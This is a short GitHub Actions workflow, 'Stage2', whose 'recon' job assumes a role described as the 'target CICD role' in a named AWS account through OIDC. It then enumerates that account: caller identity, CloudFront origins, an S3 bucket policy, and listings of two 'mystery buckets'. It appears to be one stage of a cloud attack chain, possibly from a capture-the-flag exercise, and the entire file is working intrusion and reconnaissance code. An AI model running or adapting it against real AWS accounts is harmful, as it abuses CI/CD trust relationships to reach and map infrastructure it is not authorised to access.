name: Stage2

on:
  push:
    branches:
      - corgi

permissions:
  contents: read
  id-token: write

jobs:
  recon:
    runs-on: ubuntu-latest

    steps:
      - name: Assume target CICD role
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Verify account
        run: |
          aws sts get-caller-identity

      - name: Read CloudFront configuration
        run: |
          aws cloudfront get-distribution \
            --id EKD9KH16RB5G3 \
            --query 'Distribution.DistributionConfig.Origins.Items' \
            --output json

      - name: Read site bucket policy
        run: |
          aws s3api get-bucket-policy \
            --bucket site781fe43f26b9eba3 \
            --output text

      - name: Test mystery buckets
        continue-on-error: true
        run: |
          aws s3api list-objects-v2 \
            --bucket userad88e2b168aa387e \
            --max-items 5 \
            --output json

          aws s3api list-objects-v2 \
            --bucket logad88e2b168aa387e \
            --max-items 5 \
            --output json
